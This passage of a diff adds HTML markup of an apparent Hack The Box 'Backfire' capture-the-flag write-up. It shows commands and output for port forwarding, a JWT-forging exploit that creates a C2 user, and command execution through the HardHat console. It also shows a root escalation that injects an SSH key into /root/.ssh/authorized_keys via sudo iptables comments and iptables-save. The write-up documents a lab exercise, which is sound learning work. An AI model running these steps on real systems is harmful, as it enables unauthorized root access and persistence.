+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">L&lt;/span> &lt;span class="mi">5000&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">5000&lt;/span> &lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;p>In the script, we set set the &lt;code>rhost&lt;/code>parameter to &lt;code>rhost = 'localhost:5000'&lt;/code> and proceed to create our new user.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">6
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">python3&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">exploit&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Generated&lt;/span> &lt;span class="nx">JWT&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">ey&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="nx">oH6CDUNc&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">User&lt;/span> &lt;span class="nx">sth_pentest&lt;/span> &lt;span class="nx">created&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;p>Now that our user has been created, we&amp;rsquo;ll exploit the second vulnerability to achieve code execution through the HardHat interface available on port 7096.&lt;/p>
+&lt;p>First, we forward this port and log in using our &lt;code>stj_pentest&lt;/code> account.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">L&lt;/span> &lt;span class="mi">7096&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="nx">localhost&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">7096&lt;/span> &lt;span class="nx">ilya&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;p>Next, we will access the &lt;code>ImplantInteract&lt;/code> page to use the integrated console.&lt;/p>
+&lt;p>We confirm that commands are executed as &lt;code>Sergej&lt;/code>, so we add our public key to this user&amp;rsquo;s authorized_keys file in order to connect via SSH.&lt;/p>
+&lt;p>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console1.png"
+width="972"
+height="752"
+srcset="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console1_hu_e2d8a9fb05755c10.png 480w, https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console1_hu_9ef9514df24c6ed0.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="129"
+data-flex-basis="310px"
+>&lt;/p>
+&lt;p>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console2.png"
+width="961"
+height="119"
+srcset="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console2_hu_f16c283fb5549909.png 480w, https://01MI.github.io/p/backfire-htb-writeup-linux-medium/HardHat-Console2_hu_61a1feae2d5c74e2.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="807"
+data-flex-basis="1938px"
+>&lt;/p>
+&lt;h2 id="root">Root
+&lt;/h2>&lt;h3 id="sudo-misconfiguration">Sudo misconfiguration
+&lt;/h3>&lt;p>Once connected via SSH, we notice a misconfiguration of the sudo utility for the user &lt;code>Sergej&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 3
+&lt;/span>&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 5
+&lt;/span>&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">17
+&lt;/span>&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">22
+&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">23
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="p">~&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">id_ed25519&lt;/span> &lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="mf">10.10.11.49&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Linux&lt;/span> &lt;span class="nx">backfire&lt;/span> &lt;span class="mf">6.1.0&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">29&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">amd64&lt;/span> &lt;span class="err">#&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="nx">SMP&lt;/span> &lt;span class="nx">PREEMPT_DYNAMIC&lt;/span> &lt;span class="nx">Debian&lt;/span> &lt;span class="mf">6.1.123&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">1&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">2025&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">01&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mo">02&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">x86_64&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">HardHatC2&lt;/span> &lt;span class="nx">hardhat_firewall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">hardhat_firewall&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="p">!&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">save&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rules&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">v4&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">F&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">localhost&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">REJECT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">localhost&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">sudo&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">REJECT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">l&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Matching&lt;/span> &lt;span class="nx">Defaults&lt;/span> &lt;span class="nx">entries&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="nx">sergej&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">backfire&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">env_reset&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">mail_badpass&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">secure_path&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">use_pty&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">User&lt;/span> &lt;span class="nx">sergej&lt;/span> &lt;span class="nx">may&lt;/span> &lt;span class="nx">run&lt;/span> &lt;span class="nx">the&lt;/span> &lt;span class="nx">following&lt;/span> &lt;span class="nx">commands&lt;/span> &lt;span class="nx">on&lt;/span> &lt;span class="nx">backfire&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">NOPASSWD&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nf">iptables&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl"> &lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">NOPASSWD&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">sbin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">iptables&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">save&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;p>We will rely on the following article to escalate our privileges: &lt;a class="link" href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/" target="_blank" rel="noopener"
+>https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/&lt;/a>&lt;/p>
+&lt;p>Here, the preservation of newlines in &lt;code>iptables&lt;/code> comments allows us to write to an arbitrary file using &lt;code>iptables-save&lt;/code>.&lt;/p>
+&lt;p>We proceed to overwrite the root authorized_keys file to add our own key allowing us to gain SSH access as &lt;code>root&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
+&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt"> 2
+&lt;/span>&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">15
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="nx">lo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">comment&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">comment&lt;/span> &lt;span class="err">$&amp;#39;\&lt;/span>&lt;span class="nx">nssh&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">ed25519&lt;/span> &lt;span class="nx">AA&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="nx">Dk&lt;/span> &lt;span class="nx">kali&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">kali&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="err">&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="nx">iptables&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">S&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">P&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">P&lt;/span> &lt;span class="nx">FORWARD&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">P&lt;/span> &lt;span class="nx">OUTPUT&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">32&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">32&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">5000&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">REJECT&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">reject&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">with&lt;/span> &lt;span class="nx">icmp&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">port&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">unreachable&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">32&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mf">127.0.0.1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">32&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">tcp&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">dport&lt;/span> &lt;span class="mi">7096&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">REJECT&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">reject&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">with&lt;/span> &lt;span class="nx">icmp&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">port&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">unreachable&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">A&lt;/span> &lt;span class="nx">INPUT&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">i&lt;/span> &lt;span class="nx">lo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="nx">comment&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">comment&lt;/span> &lt;span class="s">&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">ssh-ed25519 AA...Dk kali@kali
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">j&lt;/span> &lt;span class="nx">ACCEPT&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">sergej&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">backfire&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">sudo&lt;/span> &lt;span class="nx">iptables&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">save&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ssh&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">authorized_keys&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
+&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">2
+&lt;/span>&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="hl">&lt;span class="lnt">4
+&lt;/span>&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
